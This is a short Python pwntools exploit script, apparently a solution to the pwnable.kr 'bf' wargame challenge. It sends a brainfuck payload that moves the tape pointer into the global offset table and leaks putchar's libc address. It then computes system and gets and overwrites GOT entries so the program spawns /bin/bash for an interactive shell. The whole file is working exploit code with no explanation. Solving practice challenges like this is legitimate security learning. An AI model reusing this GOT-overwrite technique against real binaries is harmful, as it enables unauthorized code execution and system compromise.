from pwn import *

libc = ELF('bf_libc.so')
bf = ELF('./bf')

conn = remote('pwnable.kr', 9001)
conn.recvline_startswith(b'type')

# See readme
payload = b'<' * 112
payload += b'.'
payload += b'.>' * 4
payload += b'<' * 4
payload += b',>' * 4
payload += b'<' * 36
payload += b',>' * 4
payload += b'<' * 4
payload += b'>' * 28
payload += b',>' * 4
payload += b'.'

conn.sendline(payload)
conn.recv(1)

libc_addr = conn.recv(4)
libc_addr = int.from_bytes(libc_addr, 'little')

system = libc_addr - libc.symbols['putchar'] + libc.symbols['system']
gets = libc_addr - libc.symbols['putchar'] + libc.symbols['gets']

main_addr = bf.symbols['main']

conn.send(p32(main_addr))
conn.send(p32(system))
conn.send(p32(gets))
conn.sendline(b'/bin/bash')

conn.interactive()
